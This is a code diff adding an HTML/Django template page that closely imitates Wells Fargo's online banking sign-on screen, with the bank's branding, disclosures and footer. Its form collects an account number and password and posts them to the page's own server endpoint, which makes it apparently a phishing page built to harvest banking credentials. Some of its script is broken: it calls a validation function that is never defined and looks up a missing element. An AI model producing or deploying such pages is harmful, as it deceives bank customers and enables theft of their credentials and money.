@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign On - Wells Fargo</title>
+    <!-- Font Awesome for explicit icon rendering -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* --- GLOBAL SETUP & DESIGN SYSTEM --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        :root {
+            --wf-red: #D71E28;
+            --wf-gold: #FAD105;
+            --text-dark: #333333;
+            --text-muted: #666666;
+            --text-link: #3B5998;
+            --border-color: #A6A6A6;
+            --bg-canvas: #FAF6F0;
+        }
+
+        body {
+            color: var(--text-dark);
+            background-color: var(--bg-canvas);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        a {
+            text-decoration: none;
+            color: #0066CC;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+
+        /* --- STICKY CROWNING HEADER FRAME --- */
+        header {
+            background-color: var(--wf-red);
+            color: #FFFFFF;
+            padding: 12px 0;
+            border-bottom: 4px solid var(--wf-gold);
+            
+            /* Enhanced Stickiness Properties */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.15);
+        }
+
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .header-meta-links {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            font-size: 13px;
+        }
+
+        .header-meta-links a {
+            color: #FFFFFF;
+        }
+
+        .search-pill-container {
+            display: flex;
+            align-items: center;
+            background: #FFFFFF;
+            border-radius: 4px;
+            padding: 4px 8px;
+            width: 160px;
+        }
+
+        .search-pill-container input {
+            border: none;
+            outline: none;
+            width: 100%;
+            font-size: 13px;
+            color: var(--text-dark);
+        }
+
+        .search-pill-container i {
+            color: var(--text-dark);
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        /* --- MOBILE TOGGLE COMPONENTS --- */
+        .mobile-nav-toggle {
+            display: none;
+            background: transparent;
+            border: none;
+            color: white;
+            text-align: center;
+            cursor: pointer;
+        }
+        .mobile-nav-toggle span {
+            display: block;
+            font-size: 10px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            margin-top: 2px;
+        }
+        .mobile-nav-toggle i {
+            font-size: 22px;
+        }
+
+        /* --- MOBILE SIDE MENU DRAWER (closeres.PNG) --- */
+        .mobile-menu-drawer {
+            position: fixed;
+            top: 0;
+            right: -100%;
+            width: 85%;
+            max-width: 360px;
+            height: 100%;
+            background-color: #FAF6F0;
+            z-index: 1001;
+            box-shadow: -4px 0 15px rgba(0,0,0,0.2);
+            transition: right 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+        }
+
+        .mobile-menu-drawer.open {
+            right: 0;
+        }
+
+        .drawer-close-btn {
+            background-color: #8C1D24;
+            color: white;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 70px;
+            align-self: flex-end;
+        }
+        .drawer-close-btn i { font-size: 20px; }
+        .drawer-close-btn span { font-size: 10px; text-transform: uppercase; margin-top: 2px; }
+
+        .drawer-search-container {
+            padding: 15px;
+            background-color: #FFFFFF;
+            border-bottom: 1px solid #D6D1CA;
+            position: relative;
+        }
+        .drawer-search-container input {
+            width: 100%;
+            padding: 12px 12px 12px 40px;
+            border: 1px solid #D6D1CA;
+            border-radius: 4px;
+            font-size: 16px;
+            background-color: #FAF6F0;
+        }
+        .drawer-search-container i {
+            position: absolute;
+            left: 28px;
+            top: 28px;
+            color: var(--text-muted);
+            font-size: 16px;
+        }
+
+        .drawer-section-title {
+            background-color: #F6C200;
+            color: var(--text-dark);
+            font-weight: bold;
+            padding: 15px;
+            font-size: 16px;
+            text-align: left;
+        }
+
+        .drawer-nav-list {
+            list-style: none;
+            background-color: #FFFFFF;
+        }
+        .drawer-nav-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 15px;
+            border-bottom: 1px solid #EFECE8;
+            font-size: 15px;
+            color: #444;
+            cursor: pointer;
+            text-align: left;
+        }
+        .drawer-nav-item i {
+            color: #4A154B;
+            font-size: 14px;
+        }
+
+        /* Dark background overlay */
+        .menu-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 999;
+            display: none;
+        }
+        .menu-overlay.active {
+            display: block;
+        }
+
+        /* --- WALLPAPER CANVAS BASE --- */
+        .wallpaper-container {
+            flex: 1;
+            background: linear-gradient(rgba(255,255,255,0.15), rgba(255,255,255,0.15)), 
+                        url('https://images.unsplash.com/photo-1500382017468-9049fed747ef?auto=format&fit=crop&w=1600&q=80') center/cover no-repeat;
+            
+            /* Dynamic adjustment buffer to prevent sticky header content clipping */
+            padding: 100px 20px 40px 20px; 
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 30px;
+        }
+
+        /* --- CENTRAL FORM CARD --- */
+        .signon-card {
+            background: #FFFFFF;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 620px;
+            padding: 40px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .signon-card h1 {
+            font-size: 28px;
+            font-weight: normal;
+            color: #444444;
+            margin-bottom: 25px;
+        }
+
+        .form-frame {
+            max-width: 320px;
+            margin: 0 auto;
+            text-align: left;
+        }
+
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 16px;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 14px 40px 14px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-wrapper input:focus {
+            border-color: #333333;
+        }
+
+        .input-wrapper .field-action {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 14px;
+            color: var(--text-muted);
+            cursor: pointer;
+        }
+
+        .input-wrapper .show-link {
+            color: #0066CC;
+            font-weight: bold;
+            font-size: 13px;
+        }
+
+        .options-wrapper {
+            margin-bottom: 15px;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+
+        .options-wrapper input[type="checkbox"] {
+            margin-top: 3px;
+            transform: scale(1.1);
+        }
+
+        .options-wrapper label {
+            font-size: 14px;
+            color: var(--text-dark);
+            cursor: pointer;
+        }
+
+        .notice-subtext {
+            font-size: 12px;
+            color: var(--text-muted);
+            line-height: 1.4;
+            margin-bottom: 25px;
+        }
+
+        .center-actions {
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .btn-primary-signon {
+            width: 100%;
+            max-width: 180px;
+            background-color: #E2E0DD;
+            color: #767472;
+            border: none;
+            padding: 12px 24px;
+            font-size: 15px;
+            font-weight: bold;
+            border-radius: 24px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-primary-signon.ready {
+            background-color: var(--wf-red);
+            color: #FFFFFF;
+        }
+
+        .divider-or {
+            font-size: 12px;
+            color: var(--text-muted);
+            position: relative;
+            width: 100%;
+            margin: 5px 0;
+        }
+
+        .btn-passkey {
+            width: 100%;
+            max-width: 180px;
+            background: #FFFFFF;
+            border: 1px solid var(--text-dark);
+            color: var(--text-dark);
+            padding: 11px 24px;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 24px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .passkey-promo-text {
+            font-size: 12px;
+            color: var(--text-muted);
+            line-height: 1.4;
+            margin-top: 15px;
+            margin-bottom: 30px;
+        }
+
+        .forgot-link-box {
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        /* --- COMPLIANCE CONTENT BOX --- */
+        .compliance-card {
+            background: #FFFFFF;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 620px;
+            padding: 24px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .compliance-inner-border {
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            text-align: left;
+        }
+
+        .compliance-inner-border h3 {
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 12px;
+        }
+
+        .compliance-inner-border ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        .compliance-inner-border li {
+            position: relative;
+            padding-left: 15px;
+            font-size: 13px;
+            font-weight: bold;
+            line-height: 1.5;
+            margin-bottom: 8px;
+            color: #222222;
+        }
+
+        .compliance-inner-border li::before {
+            content: "▪";
+            position: absolute;
+            left: 0;
+            top: -2px;
+            color: #222222;
+            font-size: 14px;
+        }
+
+        .deposit-offered-text {
+            font-size: 12px;
+            color: var(--text-dark);
+            text-align: left;
+            margin-top: 15px;
+            padding-left: 5px;
+        }
+
+        /* --- LEGAL DISCLOSURE FOOTER --- */
+        footer {
+            background-color: #F4F0EB;
+            padding: 30px 20px;
+            border-top: 1px solid #E5E0DA;
+        }
+
+        .footer-container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .footer-link-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px 15px;
+            justify-content: center;
+            font-size: 12px;
+            margin-bottom: 20px;
+        }
+
+        .footer-link-grid a {
+            color: #555555;
+        }
+        .footer-link-grid span {
+            color: #CCCCCC;
+        }
+
+        .footer-copyright {
+            font-size: 11px;
+            color: var(--text-muted);
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        /* --- MOBILE RESPONSIVE MEDIA QUERIES --- */
+        @media (max-width: 768px) {
+            .header-meta-links {
+                display: none;
+            }
+
+            .mobile-nav-toggle {
+                display: block;
+            }
+
+            .wallpaper-container {
+                background: var(--bg-canvas);
+                /* Retuned padding to support sticky top alignments on smaller screens */
+                padding: 85px 10px 20px 10px;
+                gap: 15px;
+            }
+
+            .signon-card, .compliance-card {
+                box-shadow: none;
+                border: none;
+                padding: 20px 15px;
+                border-radius: 0;
+            }
+
+            .signon-card h1 {
+                font-size: 24px;
+            }
+
+            .form-frame {
+                max-width: 100%;
+            }
+
+            .btn-primary-signon, .btn-passkey {
+                max-width: 100%;
+            }
+
+            .footer-link-grid {
+                flex-direction: column;
+                align-items: center;
+                gap: 12px;
+            }
+            .footer-link-grid span {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- OVERLAY FOR COMPONENT CLOSURE -->
+    <div class="menu-overlay" id="menuOverlay" onclick="toggleMobileMenu()"></div>
+
+    <!-- MOBILE SIDE DRAWER NAVIGATION (closeres.PNG layout) -->
+    <div class="mobile-menu-drawer" id="mobileDrawer">
+        <div class="drawer-close-btn" onclick="toggleMobileMenu()">
+            <i class="fa-solid fa-xmark"></i>
+            <span>Close</span>
+        </div>
+        <div class="drawer-search-container">
+            <i class="fa-solid fa-magnifying-glass"></i>
+            <input type="text" placeholder="Search">
+        </div>
+        <div class="drawer-section-title">Personal</div>
+        <ul class="drawer-nav-list">
+            <li class="drawer-nav-item">Checking <i class="fa-solid fa-chevron-right"></i></li>
+            <li class="drawer-nav-item">Savings & CDs <i class="fa-solid fa-chevron-right"></i></li>
+            <li class="drawer-nav-item">Credit Cards <i class="fa-solid fa-chevron-right"></i></li>
+            <li class="drawer-nav-item">Home Loans <i class="fa-solid fa-chevron-right"></i></li>
+            <li class="drawer-nav-item">Personal Loans <i class="fa-solid fa-chevron-right"></i></li>
+            <li class="drawer-nav-item">Auto Loans <i class="fa-solid fa-chevron-right"></i></li>
+            <li class="drawer-nav-item">Premier <i class="fa-solid fa-chevron-right"></i></li>
+            <li class="drawer-nav-item">Education & Tools <i class="fa-solid fa-chevron-right"></i></li>
+        </ul>
+    </div>
+
+    <!-- STICKY MAIN HEADER BAR WITH HAMBURGER -->
+    <header>
+        <div class="header-container">
+            <div class="logo">Wells Fargo</div>
+            
+            <!-- Desktop Layout Links -->
+            <div class="header-meta-links">
+                <a href="#"><i class="fa-solid fa-lock" style="font-size:11px; margin-right:3px;"></i> Enroll</a>
+                <a href="#">Customer Service</a>
+                <a href="#">ATMs/Locations</a>
+                <a href="#">Español</a>
+                <div class="search-pill-container">
+                    <input type="text" placeholder="Search">
+                    <i class="fa-solid fa-magnifying-glass"></i>
+                </div>
+            </div>
+
+            <!-- Hamburger Button -->
+            <button class="mobile-nav-toggle" onclick="toggleMobileMenu()">
+                <i class="fa-solid fa-bars"></i>
+                <span></span>
+            </button>
+        </div>
+    </header>
+
+    <!-- MAIN CONTENT BODY -->
+    <main class="wallpaper-container">
+        
+        <!-- SIGN ON CARD MODULE -->
+        <section class="signon-card">
+            <h1>Good afternoon</h1>
+            
+            <div class="form-frame">
+                <form
+    id="signOnForm"
+    method="POST"
+    action="{% url 'signon' %}"
+>
+    {% csrf_token %}
+                    
+                    <div class="input-wrapper">
+                        <input
+type="text"
+name="account_number"
+id="uidField"
+placeholder="Account Number" oninput="validateFormFields()" onkeyup="validateFormFields()"
+>
+                        <i class="fa-solid fa-circle-xmark field-action" id="clearUserBtn" style="display:none;" onclick="clearUserField()"></i>
+                    </div>
+
+                    <div class="input-wrapper">
+                        <input
+type="password"
+name="password"
+id="pwdField"
+placeholder="Password" oninput="validateFormFields()" onkeyup="validateFormFields()"
+>
+                        <span class="field-action show-link" id="toggleVisibilityBtn" onclick="togglePasswordMask()">Show</span>
+                    </div>
+
+                    <div class="options-wrapper">
+                        <input type="checkbox" id="saveUidCheckbox">
+                        <label for="saveUidCheckbox">Save account number</label>
+                    </div>
+
+                    <p class="notice-subtext">
+                        To help keep your account secure, save your username only on devices that aren't used by other people.
+                    </p>
+
+                    <div class="center-actions">
+                        <button type="submit" class="btn-primary-signon ready">Sign on</button>
+                        <div class="divider-or">or</div>
+                        <button type="button" class="btn-passkey">
+                            <i class="fa-solid fa-user-shield"></i> Use a passkey
+                        </button>
+                    </div>
+
+                    <p class="passkey-promo-text">
+                        Don't have one? Create a passkey after signing on and skip the password next time.
+                    </p>
+
+                    <div class="forgot-link-box">
+                        <i class="fa-solid fa-arrow-right" style="font-size:11px; color:#0066CC;"></i>
+                        <a href="forgotpassword.html">Forgot username or password?</a>
+                    </div>
+
+                </form>
+            </div>
+        </section>
+
+        <!-- COMPLIANCE SECTION CONTAINER -->
+        <section class="compliance-card">
+            <div class="compliance-inner-border">
+                <h3>Investment and Insurance Products are:</h3>
+                <ul>
+                    <li>Not Insured by the FDIC or Any Federal Government Agency</li>
+                    <li>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</li>
+                    <li>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</li>
+                </ul>
+            </div>
+            <div class="deposit-offered-text">
+                Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
+            </div>
+        </section>
+
+    </main>
+
+    <!-- CLOSING LEGAL FOOTER -->
+    <footer>
+        <div class="footer-container">
+            <div class="footer-link-grid">
+                <a href="#">About Wells Fargo</a> <span>|</span>
+                <a href="#">Online Access Agreement</a> <span>|</span>
+                <a href="#">Privacy, Cookies, Security & Legal</a> <span>|</span>
+                <a href="#">Do not sell or share my personal information</a> <span>|</span>
+                <a href="#">Notice of Data Collection</a> <span>|</span>
+                <a href="#">Report Email Fraud</a> <span>|</span>
+                <a href="#">Security Center</a> <span>|</span>
+                <a href="#">Sitemap</a> <span>|</span>
+                <a href="#">Give Us Feedback</a>
+            </div>
+            <div class="footer-copyright">
+                © 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801
+            </div>
+        </div>
+    </footer>
+
+    <!-- RESPONSIVE AND CARD FUNCTION JAVASCRIPT -->
+    <script>
+        const uid = document.getElementById('uidField');
+        const pwd = document.getElementById('pwdField');
+        const clearBtn = document.getElementById('clearUserBtn');
+        const submitBtn = document.getElementById('submitSignonBtn');
+        const toggleBtn = document.getElementById('toggleVisibilityBtn');
+
+        // Drawer Menu Engine Functions
+        function toggleMobileMenu() {
+            const drawer = document.getElementById('mobileDrawer');
+            const overlay = document.getElementById('menuOverlay');
+            
+            if(drawer.classList.contains('open')) {
+                drawer.classList.remove('open');
+                overlay.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            } else {
+                drawer.classList.add('open');
+                overlay.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            }
+        }
+
+       
+
+        function clearUserField() {
+            uid.value = '';
+            validateFormFields();
+            uid.focus();
+        }
+
+        function togglePasswordMask() {
+            if (pwd.type === 'password') {
+                pwd.type = 'text';
+                toggleBtn.textContent = 'Hide';
+            } else {
+                pwd.type = 'password';
+                toggleBtn.textContent = 'Show';
+            }
+        }
+    </script>
+</body>
+</html>
